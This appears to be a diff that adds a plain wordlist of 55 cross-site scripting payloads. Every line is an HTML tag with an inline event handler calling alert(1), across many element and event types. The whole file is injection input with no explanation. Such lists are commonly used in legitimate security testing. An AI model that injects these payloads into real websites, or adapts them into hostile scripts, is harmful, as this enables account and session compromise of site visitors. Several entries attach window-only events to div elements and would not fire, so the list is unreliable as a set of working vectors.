@@ -1,0 +1,55 @@
+<img src="x" onerror="alert(1)">
+<svg onload="alert(1)"></svg>
+<div onmouseover="alert(1)">Hover Me</div>
+<input onfocus="alert(1)" autofocus>
+<a onclick="alert(1)">Click Here</a>
+<body onload="alert(1)">
+<iframe onload="alert(1)"></iframe>
+<img src="x" onmouseover="alert(1)">
+<video onerror="alert(1)"><source></video>
+<audio onerror="alert(1)"><source></audio>
+<div onclick="alert(1)">Click Div</div>
+<span onmouseover="alert(1)">Span Text</span>
+<button onclick="alert(1)">Press</button>
+<input type="text" onfocus="alert(1)" autofocus>
+<select onchange="alert(1)"><option>XSS</option></select>
+<textarea onfocus="alert(1)" autofocus></textarea>
+<img src="x" onload="alert(1)">
+<object onerror="alert(1)"></object>
+<embed onerror="alert(1)"></embed>
+<form onsubmit="alert(1); return false;">Submit</form>
+<div onscroll="alert(1)"><br><br><br><br><br><br><br></div>
+<body onresize="alert(1)"></body>
+<div onkeydown="alert(1)">Type</div>
+<input onkeyup="alert(1)">
+<div onmousewheel="alert(1)">Scroll Wheel</div>
+<div ondblclick="alert(1)">Double Click</div>
+<div oncontextmenu="alert(1)">Right Click</div>
+<div ondrag="alert(1)">Drag Me</div>
+<div ondrop="alert(1)" ondragover="return false">Drop Here</div>
+<div oncopy="alert(1)">Select & Copy</div>
+<div oncut="alert(1)">Cut Text</div>
+<div onpaste="alert(1)">Paste Here</div>
+<body onbeforeunload="alert(1)"></body>
+<body onunload="alert(1)"></body>
+<div onpageshow="alert(1)"></div>
+<div onpagehide="alert(1)"></div>
+<div onpopstate="alert(1)"></div>
+<div onhashchange="alert(1)"></div>
+<div ononline="alert(1)"></div>
+<div onoffline="alert(1)"></div>
+<div onstorage="alert(1)"></div>
+<div onlanguagechange="alert(1)"></div>
+<div ondevicemotion="alert(1)"></div>
+<div ondeviceorientation="alert(1)"></div>
+<div onorientationchange="alert(1)"></div>
+<div onrejectionhandled="alert(1)"></div>
+<div onunhandledrejection="alert(1)"></div>
+<div onmessage="alert(1)"></div>
+<div onbeforeprint="alert(1)"></div>
+<div onafterprint="alert(1)"></div>
+<div onappinstalled="alert(1)"></div>
+<div onsearch="alert(1)"><input type="search"></div>
+<div onanimationstart="alert(1)"></div>
+<div onanimationend="alert(1)"></div>
+<div ontransitionend="alert(1)"></div>
